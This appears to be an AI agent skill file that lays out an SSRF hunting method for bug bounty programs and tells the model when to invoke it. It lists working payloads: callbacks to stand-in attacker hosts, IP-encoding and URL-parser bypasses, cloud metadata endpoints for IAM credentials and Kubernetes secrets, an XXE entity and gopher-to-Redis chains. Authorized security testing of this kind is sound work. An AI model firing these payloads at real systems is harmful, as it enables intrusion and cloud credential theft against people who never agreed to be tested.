---
name: ssrf-bug-bounty-hunter
description: >
  Comprehensive SSRF (Server-Side Request Forgery) hunting methodology for bug bounty and VDP programs.
  Covers all SSRF types, filter/WAF bypass techniques, creative discovery vectors, escalation paths,
  and real-world tactics drawn from public BBP/VDP reports. Use this skill whenever the user asks
  about: finding SSRF, testing webhooks or URL-fetching features, bypassing URL blocklists or allowlists,
  interacting with cloud metadata APIs (AWS/GCP/Azure), abusing file uploads that fetch URLs, PDF/image
  generators that render external content, import-by-URL features, OAuth redirect abuse, XXE-to-SSRF,
  DNS rebinding, blind SSRF detection, SSRF via HTTP headers, or any internal network pivoting via
  a web server. Also trigger for questions about Burp Collaborator / interactsh listeners, IP encoding
  tricks, or any cloud credential exfiltration via server-side requests — even if the user doesn't
  say "SSRF" explicitly.
compatibility: interactsh / canarytokens, curl, ffuf/nuclei, dig/nslookup, cloud CLI tools
---

# SSRF Bug Bounty Hunter — Master Skill

## Overview & Quick-Reference

| Phase | Goal | Reference File |
|---|---|---|
| 1. Surface Mapping | Find all URL-ingesting features | [references/01-attack-surface.md] |
| 2. Detection | Confirm regular vs. blind SSRF | [references/02-detection.md] |
| 3. Bypass & Evasion | Beat blocklists, WAFs, allowlists | [references/03-bypasses.md] |
| 4. Escalation | Max business impact, cloud creds | [references/04-escalation.md] |
| 5. Chaining | SSRF + other vulns for critical findings | [references/05-chaining.md] |
| 6. Reporting | PoC structure, severity, writeup | [references/06-reporting.md] |

---

## Mental Model

SSRF exists wherever an application makes an outbound HTTP(S) request using **attacker-influenced input**. The server is your proxy — it speaks to destinations you can't reach directly. The attack goal is:

1. **Reach internal infrastructure** (metadata APIs, admin panels, internal services)
2. **Exfiltrate secrets** (cloud IAM creds, env vars, internal tokens)
3. **Pivot / port scan** the internal network
4. **Trigger state-changing actions** on internal APIs

---

## Phase 1 — Attack Surface Mapping

> Read **references/01-attack-surface.md** for the full surface inventory.

**Fast triage checklist — look for these in every target:**

- `url=`, `src=`, `href=`, `path=`, `uri=`, `link=`, `redirect=`, `callback=`, `host=`, `fetch=`, `proxy=`, `load=`, `return=`, `image_url=`, `avatar=`, `logo=`, `icon=`, `feed=`, `endpoint=` in any request parameter or JSON body
- Webhook configuration UIs (Slack-style integrations, Zapier-style, CI/CD hooks)
- "Import from URL" / "Fetch from remote" product features
- PDF/screenshot/thumbnail generators (very high-yield — Headless Chrome, wkhtmltopdf, PhantomJS)
- SVG upload endpoints (SVGs can contain `<image href="http://...">`)
- XML / DOCX / XLSX / ODT uploads (XXE → SSRF)
- Video processing (FFmpeg HLS playlist injection)
- OAuth `redirect_uri` and `post_message_uri` parameters
- Email HTML rendering / SMTP preview
- Cloud storage pre-signed URL generators
- Integrations page (CRM, Jira, Slack, email server, LDAP, database connection strings)
- Custom font loading / CSS import
- Content Security Policy report URIs
- `Link:` response header preload targets, `X-Forwarded-Host` handling

---

## Phase 2 — Detection Strategy

> Read **references/02-detection.md** for full detection methodology.

**Decision tree:**

```
Does the server return body content from the fetched URL?
├── YES → Regular SSRF → probe internal IPs directly
└── NO  → Blind SSRF
    ├── Does it return different HTTP status / timing?
    │   └── YES → Semi-blind: use error-based port scanning
    └── Does OOB callback listener fire?
        ├── YES → Confirmed blind SSRF
        └── NO  → May still exist — try DNS-only callback
```

**Quick payload set (start here):**

```
# OOB — always test first
http://YOUR.INTERACTSH.HOST/ssrf-test
https://YOUR.BURP.COLLABORATOR.NET/

# Internal IPv4
http://127.0.0.1/
http://0.0.0.0/
http://localhost/
http://[::1]/              ← IPv6 localhost
http://0/                  ← shorthand resolves to 0.0.0.0 on Linux
http://127.1/              ← compressed dotted notation

# Internal subnets
http://192.168.0.1/
http://10.0.0.1/
http://172.16.0.1/
```

---

## Phase 3 — Bypasses & Evasion

> Read **references/03-bypasses.md** for the full bypass encyclopedia.

**Top-10 most effective bypasses (2024 field-tested):**

1. **Decimal/Dword encoding**: `http://2130706433/` = `http://127.0.0.1/`
2. **IPv6 mapped**: `http://[::ffff:127.0.0.1]/` or `http://[::ffff:7f00:1]/`
3. **DNS A-record to 127.0.0.1**: `http://localtest.me/` (public wildcard DNS)
4. **Open redirect chain**: `http://trusted.example.com/redirect?url=http://169.254.169.254/`
5. **URL fragment trick**: `http://attacker.com#@127.0.0.1/`
6. **Credential injection**: `http://127.0.0.1@attacker.com/` — parser ambiguity
7. **Double URL encoding**: `http://127.0.0.1%252F%252Fadmin`
8. **302 redirect from attacker server**: Follow-on request hits internal target
9. **DNS rebinding**: Two-TTL attack — first resolution gives allowed IP, second gives 127.0.0.1
10. **Scheme switching**: `dict://`, `gopher://`, `file://`, `tftp://`, `ldap://`

---

## Phase 4 — Escalation Paths

> Read **references/04-escalation.md** for full escalation playbook.

**Priority escalation targets:**

| Target | URL | Impact |
|---|---|---|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Critical — IAM keys |
| AWS IMDSv2 | Two-step: PUT token → GET with token | Critical |
| GCP metadata | `http://metadata.google.internal/computeMetadata/v1/` + header | Critical |
| Azure IMDS | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` + header | Critical |
| Kubernetes API | `https://kubernetes.default.svc/api/v1/secrets` | Critical |
| Internal admin | `http://admin.internal/` or `http://10.0.0.1:8080/` | High |
| Redis | `redis://127.0.0.1:6379/` via gopher:// | High |
| Elasticsearch | `http://127.0.0.1:9200/_cat/indices` | High |

---

## Phase 5 — Chaining SSRF

> Read **references/05-chaining.md** for chain scenarios.

Key chains:
- **SSRF → RCE**: via Redis/Memcached gopher:// write, Jenkins /script endpoint, Kubernetes exec
- **SSRF → Auth bypass**: internal admin panel without auth
- **XXE → SSRF**: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/...">]>`
- **Open redirect → SSRF**: allowlist bypass via trusted domain redirect
- **CORS misconfiguration → SSRF data exfil**: internal response reflected cross-origin

---

## Phase 6 — Reporting

> Read **references/06-reporting.md** for report templates.

Severity guide (HackerOne/Bugcrowd standard):
- **Critical**: Cloud credential exfil, internal RCE, Kubernetes secret access
- **High**: Internal service access, admin panel bypass, database access
- **Medium**: Blind SSRF with confirmed internal network access, port scanning
- **Low / Info**: Blind SSRF with only OOB DNS callback, no internal access confirmed

---

## Quick-Start Workflow

```
1. Intercept ALL requests in Burp — look for URL/path/host params
2. Send to Repeater — replace value with http://YOUR.INTERACTSH.HOST/test
3. Check Collaborator/interactsh for DNS + HTTP callbacks
4. If OOB fires → confirmed blind SSRF → escalate to metadata endpoints
5. If blocked → apply bypasses from references/03-bypasses.md
6. Document full request/response chain → write report
```
